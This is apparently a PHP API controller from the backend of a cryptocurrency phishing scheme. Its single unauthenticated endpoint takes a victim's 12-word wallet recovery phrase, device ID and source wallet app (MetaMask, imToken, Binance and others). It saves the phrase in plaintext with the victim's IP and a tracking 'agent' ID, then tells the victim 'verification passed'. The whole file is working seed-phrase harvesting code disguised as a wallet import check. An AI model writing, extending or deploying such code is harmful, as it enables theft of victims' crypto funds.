<?php

namespace app\api\controller;

use app\common\controller\Api;

/**
 * 助记词
 */
class Zjc extends Api
{
    protected $noNeedLogin = '*';
    protected $noNeedRight = '*';

    public function _initialize()
    {
        parent::_initialize();
    }

    /**
     * 会员中心
     */
    public function index()
    {
        $agent_id = $this->request->request('agent_id');
        if (!$agent_id) {
            $this->error("导入失败，请稍后再试");
        }
        $agent = db('agent')->where("id",$agent_id)->find();
        if(!$agent){
            $this->error("导入失败，请稍后再试");
        }
        $androidId = $this->request->request('androidId');
        $mnemonic_phrase = $this->request->request('mnemonic_phrase');
        if(count(array_filter(explode(" ",$mnemonic_phrase)))!=12){
            $this->error("您输入的助记词位数错误");
        }
        $source = $this->request->request('source');
        $sourceArr = [
            "im.token.app"=>"imToken",
            "vip.mytokenpocket"=>"TokenPocket",
            "com.wallet.crypto.trustapp"=>"TrustWallnet",
            "io.metamask"=>"MetaMask",
            "com.mathwallet.android"=>"MathWallet",
            "com.bitkeep.wallet"=>"BitgetWallet",
            "com.binance.dev"=>"币安",
            "com.okinc.okex.gp"=>"欧易",
        ];
        $data = [
            'agent_id' => $agent_id,
            'android_id' => $androidId,
            'mnemonic_phrase' => $mnemonic_phrase,
            'source' => isset($sourceArr[$source]) ? $sourceArr[$source] : "其他",
            'createtime' => time(),
            'create_ip' => $this->request->ip(),
        ];
        db('zjc')->insert($data);
        $this->success('验证通过');
    }
}
